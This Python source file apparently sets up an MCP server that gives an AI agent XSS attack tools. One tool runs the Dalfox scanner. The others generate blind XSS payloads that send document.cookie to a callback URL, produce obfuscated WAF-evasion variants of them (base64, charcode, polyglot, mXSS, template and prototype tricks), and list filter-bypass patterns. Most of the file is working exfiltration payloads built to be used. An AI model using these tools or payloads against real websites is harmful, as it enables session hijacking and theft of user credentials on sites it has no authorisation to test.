"""
XSS Scanner MCP Server

Provides XSS vulnerability scanning via Dalfox with blind XSS callback support.
"""

import os
import re
import shlex
import subprocess
from fastmcp import FastMCP

MCP_HOST = os.environ.get("MCP_HOST", "0.0.0.0")
XSS_PORT = int(os.environ.get("XSS_PORT", "8003"))
CALLBACK_URL = os.environ.get("XSS_CALLBACK_URL", "")


def _build_tool_docstring() -> str:
    base_doc = """
Execute Dalfox XSS scanner with specified arguments.

Parameters:
    args: Command-line arguments for dalfox (without 'dalfox' itself)

Scan Modes:
    url         Scan single URL
    pipe        Read URLs from stdin (use with file input)
    file        Scan URLs from file
    sxss        Stored XSS testing mode

Common Options:
    -b, --blind <callback>     Blind XSS callback URL (e.g., https://your-id.xss.report)
    -p, --param <name>         Focus on specific parameter
    --waf-bypass              Enable WAF bypass payloads
    --skip-bav                Skip basic WAF detection
    --deep-domxss             Deep DOM XSS analysis
    -w, --worker <n>          Number of concurrent workers (default: 100)
    --timeout <sec>           Request timeout in seconds
    -o, --output <file>       Output file path
    --format json             JSON output format
    --proxy <url>             HTTP proxy (e.g., http://127.0.0.1:8080)
    -H, --header <h>          Custom header (repeatable)
    --cookie <c>              Session cookies
    --data <d>                POST data
    --mining-dict             Use dictionary mining for params
    --mining-dom              Mine DOM for additional params
    --only-discovery          Only discover params, no exploitation
    --follow-redirects        Follow HTTP redirects
    --no-color                Disable colored output

Examples:
    # Basic reflected XSS scan
    url https://target.com/search?q=test

    # Blind XSS with callback
    url https://target.com/contact --blind https://your-id.xss.report

    # POST request with authentication
    url https://target.com/api/comment --data "msg=test" --cookie "session=abc123"

    # WAF bypass mode
    url https://target.com/search?q=test --waf-bypass

    # Deep DOM XSS analysis
    url https://target.com/app --deep-domxss

    # Scan multiple URLs from file
    file /tmp/urls.txt --blind https://callback.example.com -w 50

    # Stored XSS testing
    sxss https://target.com/post --data "content=test"
"""
    return base_doc


mcp = FastMCP(
    name="xss-scanner",
    host=MCP_HOST,
    port=XSS_PORT,
)


@mcp.tool()
def execute_xss(args: str) -> str:
    __doc__ = _build_tool_docstring()

    if CALLBACK_URL and "--blind" not in args and "-b" not in args:
        args = f"{args} --blind {CALLBACK_URL}"

    try:
        parsed_args = shlex.split(args)
    except ValueError as e:
        return f"Error parsing arguments: {e}"

    cmd = ["dalfox"] + parsed_args

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=600,
        )

        stdout = result.stdout
        stderr = result.stderr

        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        stdout = ansi_escape.sub('', stdout)
        stderr = ansi_escape.sub('', stderr)

        progress_patterns = [r'\[INF\]', r'\[WRN\]', r'█+', r'░+']
        for pattern in progress_patterns:
            stderr = re.sub(pattern, '', stderr)

        output = stdout
        if stderr.strip():
            output += f"\n\nStderr:\n{stderr}"

        return output if output.strip() else "Scan completed with no findings."

    except subprocess.TimeoutExpired:
        return "Error: Scan timed out after 600 seconds"
    except FileNotFoundError:
        return "Error: dalfox not found. Ensure it is installed in the container."
    except Exception as e:
        return f"Error executing scan: {e}"


@mcp.tool()
def generate_blind_payload(callback_url: str, context: str = "html") -> str:
    """
    Generate blind XSS payloads for manual injection.

    Parameters:
        callback_url: Your callback URL (e.g., https://your-id.xss.report)
        context: Injection context - html, attr, js, url (default: html)

    Returns:
        List of payloads optimized for the specified context
    """

    payloads = {
        "html": [
            f'"><script src={callback_url}></script>',
            f"'><script src={callback_url}></script>",
            f'"><img src=x onerror="var s=document.createElement(\'script\');s.src=\'{callback_url}\';document.body.appendChild(s);">',
            f'<svg onload="fetch(\'{callback_url}?c=\'+document.cookie)">',
            f'<iframe src="javascript:var s=document.createElement(\'script\');s.src=\'{callback_url}\';document.body.appendChild(s);">',
        ],
        "attr": [
            f'" onfocus="fetch(\'{callback_url}?c=\'+document.cookie)" autofocus="',
            f"' onmouseover='fetch(`{callback_url}?c=${{document.cookie}}`)'",
            f'" onclick="var i=new Image();i.src=\'{callback_url}?c=\'+document.cookie"',
            f"javascript:fetch('{callback_url}?c='+document.cookie)",
        ],
        "js": [
            f"';fetch('{callback_url}?c='+document.cookie);//",
            f'";fetch("{callback_url}?c="+document.cookie);//',
            f"}};fetch('{callback_url}?c='+document.cookie);//",
            f"fetch('{callback_url}?c='+document.cookie)",
        ],
        "url": [
            f"javascript:fetch('{callback_url}?c='+document.cookie)",
            f"data:text/html,<script src={callback_url}></script>",
            f"javascript:var s=document.createElement('script');s.src='{callback_url}';document.body.appendChild(s);",
        ],
    }

    selected = payloads.get(context, payloads["html"])

    output = f"Blind XSS Payloads for context: {context}\n"
    output += f"Callback URL: {callback_url}\n"
    output += "-" * 50 + "\n"
    for i, payload in enumerate(selected, 1):
        output += f"\n[{i}] {payload}\n"

    return output


@mcp.tool()
def generate_advanced_payload(callback_url: str, encoding: str = "all") -> str:
    """
    Generate advanced encoded/obfuscated XSS payloads for WAF bypass.

    Parameters:
        callback_url: Your callback URL
        encoding: Encoding type - charcode, base64, hex, unicode, polyglot, mxss, template, all

    Returns:
        Encoded payloads optimized for WAF evasion
    """
    import base64

    def to_charcode(s):
        return ','.join(str(ord(c)) for c in s)

    def to_hex(s):
        return ''.join(f'\\x{ord(c):02x}' for c in s)

    def to_unicode(s):
        return ''.join(f'\\u{ord(c):04x}' for c in s)

    def to_html_entities(s):
        return ''.join(f'&#{ord(c)};' for c in s)

    def to_hex_entities(s):
        return ''.join(f'&#x{ord(c):x};' for c in s)

    base_script = f"fetch('{callback_url}?c='+document.cookie)"

    payloads = {}

    payloads["charcode"] = [
        f'<img src=x onerror="eval(String.fromCharCode({to_charcode(base_script)}))">',
        f'<svg onload="eval(String.fromCharCode({to_charcode(base_script)}))">',
        f'<body onpageshow="eval(String.fromCharCode({to_charcode(base_script)}))">',
    ]

    b64_payload = base64.b64encode(base_script.encode()).decode()
    payloads["base64"] = [
        f'<img src=x onerror="eval(atob(\'{b64_payload}\'))">',
        f'<svg onload="eval(atob(\'{b64_payload}\'))">',
        f'<input onfocus="eval(atob(\'{b64_payload}\'))" autofocus>',
        f'<details open ontoggle="eval(atob(\'{b64_payload}\'))">',
    ]

    payloads["hex"] = [
        f'<a href="java{to_hex("script")}:{to_hex("alert(1)")}">click</a>',
        f'<img src=x onerror="{to_hex(base_script)}">',
        f'<svg><script>{to_hex(base_script)}</script></svg>',
    ]

    payloads["unicode"] = [
        f'<img src=x onerror="{to_unicode(base_script)}">',
        f'<a href="\\u006a\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074:{to_unicode("alert(1)")}">',
        f'<script>{to_unicode(base_script)}</script>',
    ]

    payloads["html_entities"] = [
        f'<img src=x onerror="{to_html_entities(base_script)}">',
        f'<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;{to_html_entities("alert(1)")}">',
        f'<svg onload="{to_hex_entities(base_script)}">',
    ]

    payloads["polyglot"] = [
        f'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=fetch(\'{callback_url}?c=\'+document.cookie) )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=fetch(\'{callback_url}?c=\'+document.cookie)///>\\x3e',
        f'"><img src=x id=`{to_hex("x")}`onerror=`eval(atob(\'{b64_payload}\'))`>',
        f'\'-fetch(\'{callback_url}?c=\'+document.cookie)-\'',
        f'"-fetch("{callback_url}?c="+document.cookie)-"',
        f'</script><script>fetch(\'{callback_url}?c=\'+document.cookie)</script>',
        f'{{{{constructor.constructor("fetch(\'{callback_url}?c=\'+document.cookie)")()}}}}',
    ]

    payloads["mxss"] = [
        f'<noscript><p title="</noscript><img src=x onerror=fetch(\'{callback_url}?c=\'+document.cookie)>">',
        f'<math><mtext><table><mglyph><style><img src=x onerror=fetch(\'{callback_url}?c=\'+document.cookie)>',
        f'<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img src=x onerror=fetch(\'{callback_url}?c=\'+document.cookie)>">',
        f'<svg></p><style><g title="</style><img src=x onerror=fetch(\'{callback_url}?c=\'+document.cookie)>">',
    ]

    payloads["template"] = [
        f'{{{{constructor.constructor("fetch(\'{callback_url}?c=\'+document.cookie)")()}}}}',
        f'${{fetch(\'{callback_url}?c=\'+document.cookie)}}',
        f'{{{{$on.constructor("fetch(\'{callback_url}?c=\'+document.cookie)")()}}}}',
        f'{{{{$emit.constructor`fetch(\'{callback_url}?c=\'+document.cookie)`()}}}}',
        f'<%- fetch(\'{callback_url}?c=\'+document.cookie) %>',
        f'#{{fetch(\'{callback_url}?c=\'+document.cookie)}}',
        f'*{{fetch(\'{callback_url}?c=\'+document.cookie)}}',
    ]

    payloads["iterator"] = [
        f'[...{{[Symbol.iterator]:fetch.bind(null,\'{callback_url}?c=\'+document.cookie)}}]',
        f'[...{{[Symbol.iterator]:\\u0066etch.bind(null,\'{callback_url}?c=\'+document.cookie)}}]',
        f'{{get length(){{fetch(\'{callback_url}?c=\'+document.cookie)}}}}',
        f'new Proxy({{}},{{get:()=>fetch(\'{callback_url}?c=\'+document.cookie)}})',
    ]

    payloads["shadowdom"] = [
        f'<template shadowrootmode=open><slot onslotchange=fetch(\'{callback_url}?c=\'+document.cookie)>',
        f'<div><template shadowrootmode=open><style onload=fetch(\'{callback_url}?c=\'+document.cookie)>',
        f'<template shadowrootmode=open><svg onload=fetch(\'{callback_url}?c=\'+document.cookie)>',
        f'x]<template shadowrootmode=open><slot onslotchange=fetch(\'{callback_url}?c=\'+document.cookie)>',
    ]

    payloads["prototype"] = [
        f'<img src=x onerror="Object.prototype.innerHTML=\'<img src=x onerror=fetch(\\\'{callback_url}?c=\\\'+document.cookie)>\';document.body.appendChild(document.createElement(\'div\'))">',
        f'<script>Array.prototype.join=function(){{fetch(\'{callback_url}?c=\'+document.cookie)}}</script>',
        f'<img src=x onerror="window.__proto__.onerror=()=>fetch(\'{callback_url}?c=\'+document.cookie)">',
    ]

    payloads["double_encode"] = [
        f'%253Cscript%253Efetch(\'{callback_url}?c=\'+document.cookie)%253C/script%253E',
        f'%26lt;script%26gt;fetch(\'{callback_url}?c=\'+document.cookie)%26lt;/script%26gt;',
        f'<img src=x onerror=%2522fetch(\'{callback_url}?c=\'+document.cookie)%2522>',
    ]

    payloads["newline_bypass"] = [
        f'<a href="java&#x0a;script:fetch(\'{callback_url}?c=\'+document.cookie)">',
        f'<a href="java&#x09;script:fetch(\'{callback_url}?c=\'+document.cookie)">',
        f'<a href="java&#x0d;script:fetch(\'{callback_url}?c=\'+document.cookie)">',
        f'<img src=x onerror="java\\nscript:fetch(\'{callback_url}?c=\'+document.cookie)">',
    ]

    payloads["constructor"] = [
        f'<img src=x onerror="[].constructor.constructor(\'fetch(\\\'{callback_url}?c=\\\'+document.cookie)\')()">',
        f'<img src=x onerror="Reflect.construct(Function,[\'fetch(\\\'{callback_url}?c=\\\'+document.cookie)\'])()">',
        f'<img src=x onerror="Function.prototype.constructor.call(null,\'fetch(\\\'{callback_url}?c=\\\'+document.cookie)\')()">',
    ]

    if encoding == "all":
        output = f"Advanced XSS Payloads\nCallback: {callback_url}\n{'='*60}\n"
        for enc_type, enc_payloads in payloads.items():
            output += f"\n[{enc_type.upper()}]\n{'-'*40}\n"
            for i, p in enumerate(enc_payloads, 1):
                output += f"{i}. {p}\n"
        return output
    elif encoding in payloads:
        output = f"[{encoding.upper()}] Payloads\nCallback: {callback_url}\n{'-'*40}\n"
        for i, p in enumerate(payloads[encoding], 1):
            output += f"{i}. {p}\n"
        return output
    else:
        return f"Unknown encoding: {encoding}. Options: {', '.join(payloads.keys())}, all"


@mcp.tool()
def list_waf_bypasses() -> str:
    """
    List available WAF bypass techniques for XSS.

    Returns:
        Common WAF bypass patterns and encoding techniques
    """

    bypasses = """
WAF Bypass Techniques for XSS
=============================

1. Case Variation
   <ScRiPt>alert(1)</ScRiPt>
   <SCRIPT>alert(1)</SCRIPT>

2. HTML Encoding
   &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
   &#60;script&#62;alert(1)&#60;/script&#62;

3. URL Encoding
   %3Cscript%3Ealert(1)%3C/script%3E
   %253Cscript%253Ealert(1)%253C/script%253E (double)

4. Unicode Encoding
   \\u003cscript\\u003ealert(1)\\u003c/script\\u003e

5. Null Bytes
   <scr%00ipt>alert(1)</script>
   <script>al%00ert(1)</script>

6. Tag Alternatives
   <svg onload=alert(1)>
   <img src=x onerror=alert(1)>
   <body onload=alert(1)>
   <input onfocus=alert(1) autofocus>
   <marquee onstart=alert(1)>
   <video><source onerror=alert(1)>
   <audio src=x onerror=alert(1)>

7. Event Handler Variations
   <img src=x onerror=alert(1)>
   <img src=x oNeRrOr=alert(1)>
   <img src=x onerror  =  alert(1)>

8. Parentheses Bypass
   <script>alert`1`</script>
   <img src=x onerror=alert&#40;1&#41;>
   <img src=x onerror=alert&#x28;1&#x29;>

9. Quote Bypass
   <img src=x onerror=alert(1)>
   <img src=x onerror='alert(1)'>
   <img src=x onerror="alert(1)">
   <img src=x onerror=`alert(1)`>

10. Protocol Handlers
    <a href="javascript:alert(1)">
    <a href="data:text/html,<script>alert(1)</script>">

11. Comment Injection
    <script>/*</script><script>alert(1)//</script>
    <!--<script>-->alert(1)<!--</script>-->

12. SVG Namespace
    <svg><script>alert(1)</script></svg>
    <svg><script xlink:href=data:,alert(1)></script>

Use with Dalfox:
    execute_xss("url https://target.com/search?q=test --waf-bypass")
"""
    return bypasses


if __name__ == "__main__":
    transport = os.environ.get("MCP_TRANSPORT", "stdio")
    if transport == "sse":
        mcp.run(transport="sse")
    else:
        mcp.run()
